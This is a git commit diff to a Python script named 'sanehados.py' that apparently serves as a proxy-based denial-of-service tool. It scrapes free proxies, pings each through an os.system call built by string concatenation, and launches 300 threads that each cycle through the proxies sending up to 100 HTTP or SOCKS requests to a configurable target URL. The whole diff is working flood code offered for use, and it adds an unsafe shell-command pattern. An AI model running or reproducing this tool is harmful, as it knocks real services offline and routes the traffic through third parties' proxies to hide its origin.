63e01afa71ee3429cb4d387fa6c411216c317bc4
Gowtham <48803263+goddamnnoob@users.noreply.github.com>
2020-10-18 12:38:35 +0530

    proxy check added

--- sanehados.py
+++ sanehados.py
@@ -4,38 +4,51 @@ import requests
 import random
 import re
 import threading
+import os
+
+url = 'http://www.icanhazip.com' #TARGET
 def get_proxies():
 	proxies = []
 	res = requests.get('https://free-proxy-list.net').text
 	p = re.findall('(\d+\.\d+\.\d+\.\d+):(\d+)',res)
 	for proxy in p:
-        	proxies.append(proxy[0]+':'+proxy[1])
+		response = os.system("ping -c 1 " + proxy[0])
+		if response == 0:
+                        print (proxy[0], 'is up!')
+                        proxies.append(proxy[0]+':'+proxy[1])
 	return proxies
+
 def attack(proxies):
 	s= requests.Session()
 	proxy = random.choice(proxies)
-	s.proxies = {"http":proxy,"https":proxy}
-	for i in range(10):
-		try:
-			res = s.get('http://www.icanhazip.com',timeout = 6)
-			print(res.text)
-		except Exception as e:
+	for proxy in proxies:
+		for i in range(100):
 			try:
-				s.proxies = {"http":"socks5://"+proxy,"https":"socks5://"+proxy}
-				res = s.get('http://www.icanhazip.com',timeout = 1.5)
+				s.proxies = {"http":proxy,"https":proxy}
+				res = s.get(url,timeout = 6)
 				print(res.text)
 			except Exception as e:
 				try:
-					s.proxies = {"http":"socks4://"+proxy,"https":"socks4://"+proxy}
-					res = s.get('http://www.icanhazip.com',timeout =1.5)
+					s.proxies = {"http":"socks5://"+proxy,"https":"socks5://"+proxy}
+					res = s.get(url,timeout = 1.5)
 					print(res.text)
 				except Exception as e:
-					print("failed")
-					return 0
+					try:
+						s.proxies = {"http":"socks4://"+proxy,"https":"socks4://"+proxy}
+						res = s.get(url,timeout =1.5)
+						print(res.text)
+					except Exception as e:
+						print("failed")
+						return 0
 
 if __name__ == "__main__":
 	print("START!")
+	print("It takes a while to get started please be patient you can force quit by long pressing ctrl+c ")
 	proxies = get_proxies()
-	for i in range(10):
+	print("Up proxies:")
+	print(proxies)
+	print("Party starts in 321..............")
+	for i in range(300):
 		t = threading.Thread(target=attack, args=(proxies,))
 		t.start()
+
